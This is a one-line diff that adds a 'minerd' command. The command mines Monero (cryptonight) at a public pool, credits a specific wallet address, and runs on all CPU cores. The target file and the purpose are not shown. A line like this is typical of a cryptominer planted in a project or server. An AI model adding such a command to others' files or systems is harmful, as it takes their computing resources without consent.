@@ -1,0 +1,1 @@
+minerd -a cryptonight  -o stratum+tcp://pool.minexmr.com:5555 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1a7Qy2ashEMAUkF6f -p x -t nproc
